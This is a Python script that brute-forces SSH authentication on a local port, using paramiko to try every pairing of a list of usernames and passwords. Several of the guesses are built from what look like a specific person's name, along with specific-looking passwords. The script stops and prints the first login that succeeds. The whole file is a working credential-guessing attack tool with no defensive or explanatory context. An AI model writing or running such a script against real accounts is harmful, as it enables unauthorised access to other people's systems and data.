import paramiko
import sys
import time

HOST = 'localhost'
PORT = 33891
USERS = ['wuchang', 'chiang', 'chiangchenglung', 'chiang_cheng_lung', 'admin', 'user', 'o0930', 'ubuntu']
PASSWORDS = ['97573469', 'chiang cheng lung', 'chiangchenglung', 'poiuY926', 'wuchang', '123456']

def test_auth(user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(HOST, PORT, user, password, timeout=5)
        print(f"SUCCESS: Connected with user '{user}' and password '{password}'")
        client.close()
        return True
    except paramiko.AuthenticationException:
        pass # Silent fail to keep output clean
    except Exception as e:
        print(f"Error checking {user}:{password} -> {e}")
    return False

if __name__ == "__main__":
    print(f"Testing connection to {HOST}:{PORT} with multiple credentials...")
    for user in USERS:
        for pwd in PASSWORDS:
            print(f"Trying {user} / {pwd}...", end='\r')
            if test_auth(user, pwd):
                print(f"\nFOUND MATCH: User: '{user}', Password: '{pwd}'")
                print("Credentials verified.")
                sys.exit(0)
    
    print("\nAll attempts failed.")
    sys.exit(1)
